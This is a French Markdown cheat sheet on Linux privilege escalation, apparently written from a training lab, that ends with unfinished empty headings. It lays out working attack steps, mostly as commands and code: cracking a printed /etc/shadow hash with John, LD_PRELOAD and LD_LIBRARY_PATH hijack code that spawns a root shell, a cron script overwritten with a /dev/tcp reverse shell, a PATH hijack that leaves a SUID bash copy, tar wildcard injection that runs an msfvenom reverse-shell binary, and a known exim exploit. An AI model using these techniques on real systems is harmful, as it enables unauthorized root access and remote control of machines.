# Linux : Escalation de privilége



## /etc/shadow

*  Afficher le dossier de stockage des mots de passe, des utilisateurs locaux sous forme de Hash.


```
$> cat /etc/shadow

```

**[root] permission required**



![This is an alt text.](/image/sample.png "This is a sample image.")



Hash sha512crypt du root récupéré des premier au deuxieme deux point (:)

>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0

* Utilisation de John pour casser le hash.
```
$> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

>output > password123

#
## /etc/passwd
* Afficher le dossier qui contient les info user, lisible par tous.

```
$> cat /etc/passwd
```

# 
## GTFobins

* [GTFobins](https://gtfobins.github.io) documente les moyens d'utiliser des commandes système légitimes pour contourner les protections de sécurité sur Unix et Linux.

#
## Sudo-Variables d'environnement

* On peut configuré sudo pour hériter de certaines variables d'environnement de l'env user. Verifier qu'elles
variables d'environnement son hértiées (regarde les opt env_keep)

```
$> sudo -l
```
**LD_PRELOAD** & **LD_LIBRARY_PATH** sont hérités de l'env user.
>**LD_PRELOAD** -> charge un objet partagé avant tout les programme executé.

>**LD_LIBRARY_PATH** -> fournit une liste de répertoirs dans lesquels les bibiliothéques
 partagées sont recherchées en premier.
 
* Créez un objet partagé a l'aide du code situé dans /home/user/tools/sudo/preload.c 

```
$> gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

*preload.c*
```
void _init()
{
    unsetenv("LD_PRELOAD"):
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

* Exécuter l'un des programmes que l'ont est autorisé a exec via sudo (liste des prog avec sudo -l)

```
$> sudo LD_PRELOAD=/tmp/preload.so prog_name
```
```
root@debian:/home/user $> EZ un shell root
```

 > ==================Autre méthode===================
 
 * Utilisation de **Ldd** sur *apache2* pour voir qu'elle bibliothèques partagées il utilise.

```
$> ldd /usr/sbin/apache2
```

* Créez un objet partagé avec le meme nom que l'un des bibliothèques répertoriées (libcrypt.so.1) en utilisant le code situé dans /home/user/tools/sudo/library_path.c

```
$> gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

*library_path.c*
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack()
{
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

```

* Exécuter Apache2 en utilisant sudo, tout en définissant les variable d'environnement LD_LIBRARY_PATH sur /tmp (où l'ont génére l'objet partagé compilé)

```
$> sudo LD_LIBRARY_PATH=/tmp apache2
```
```
root@debian:/home/user $> EZ un shell root
```

#
## Cron - Autorisation de fichiers

* Affichez le contenu de la crontab a léchelle du système.
```
$> cat /etc/crontab
```
> On remarque que l'une des tache execute *overwrite.sh* et l'autre *compress.sh*

* Essayon de localiser overwrite.sh
```
$> locate overwrite.sh
```
* Maintenant qu'on a le chemin voyont les droit du fichier
```
$> ls -l /usr/local/bin/overwrite.sh
```
> On voie qu'on a les droits d'écriture

* On vas remplacez le contenue d'overwrite.sh par se qui suit et en remplacant l'ip par celle de notre box attaqué

*overwrite.sh*
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 
```

* Ensuite on ouvre un listener avec netcat du le port 4444 et on attend que la tache cron s'exécute

```
$> nc -nvlp 4444
```

```
root@debian:/home/user $> EZ un shell root
```
#
## Cron - Variable d'environnement PATH

* Affichez le contenu de la crontab a léchelle du système.
```
$> cat /etc/crontab
```
> On voie que la variable PATH commence par /home/user

* On créez un fichier appelé **overwrite.sh** dans le répartoir */home/user*

*overwrite.sh*
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash 
```

* On oublie pas de mettre les droit au fichier

```
$> chmod x+ /home/user/overwrite.sh
```

* Attendre a peut prés 1min puis exécuter la commande suivante pour obtenir un shell root

```
$> /tmp/rootbash -p
```
```
rootbash-4.1$> EZ un shell root
```
#
## Cron - Caractères génériques

* Afficher le contenu de l'autre script de tache cron.

```
$> cat /usr/local/bin/compress.sh
```
> La commande tar est exécuter avec l'étoile (*) dans notre répertoir personel /home/user

* Utilisation de msfvenom pour générer un binaire ELF de shell inversé en utilisant l'adresse ip attaquer.

```
$> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
* Déplacer le binaire sur la sessions ssh
```
$> scp /home/user/shell.elf user@192.168.10.131:/home/user
```
* Crée deux fichier dans /home/user qui lorsque la tache cron s'exécutera seront inclue grace au (*)
```
$> touch /home/user/--checkpoint=1
```
```
$> touch /home/user/--checkpoint-action=exec=shell.elf
```
> Les nom de fichier corresponde a des options de ligne de commande tar valides, il les traitera comme des ptions de ligne

* Ouvrir un listener netcat sur le port 4444

```
$> nc -nvlp 4444
```
```
$> EZ un shell root
```

#
## Exécutables SUID/SGID - Exploit connus

* Chercher les fichier SUID/SGID
```
$> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
> On voie un résultat qui ressort particulierement /usr/sbin/exim-4.54-3

* On vas cherche un exploit connu pour cet version d'exim sur
[Exploit-DB](https://www.exploit-db.com/), ou google ou GitGub.

* Implémenter et éxecuter le script récuperer.
```
$> /home/user/myscript/exim/cve-2016-1531.sh
```
```
$> EZ un shell root
```
#
## Exécutables SUID-SGID - Variable d'environnement




#
#
#
#
#
#
#
#

